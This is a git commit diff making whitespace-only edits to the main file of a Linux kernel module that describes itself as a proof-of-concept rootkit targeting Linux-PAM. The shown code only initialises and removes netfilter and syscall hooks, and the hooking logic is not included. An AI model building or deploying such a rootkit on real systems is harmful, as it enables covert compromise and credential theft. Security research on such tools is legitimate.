88a501eb07fcaaec898d042ee476009967b31811
Armin <66900830+arm1nt@users.noreply.github.com>
2024-05-07 20:08:49 +0200

    Update pamkit.c

--- rootkit/pamkit.c
+++ rootkit/pamkit.c
@@ -5,18 +5,15 @@
 #include "net.h"
 #include "hooking_framework.h"
 
-
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("arm1nt");
 MODULE_DESCRIPTION("PoC rootkit targeting Linux-PAM");
-
 
 static int __init pamkit_init(void)
 {
     pr_info("Initializing pamkit\n");
 
     int ret = 0;
-
     ret = add_netfilter_hook();
 
     if (ret) {
@@ -32,22 +29,18 @@ static int __init pamkit_init(void)
     }
 
     pr_info("Initialized pamkit\n");
-
     return ret;
 }
-
 
 static void __exit pamkit_exit(void)
 {
     pr_info("Unloading pamkit\n");
 
     remove_netfilter_hook();
-
     undo_syscall_hooking();
 
     pr_info("Unloaded pamkit\n");
 }
-
 
 module_init(pamkit_init);
 module_exit(pamkit_exit);
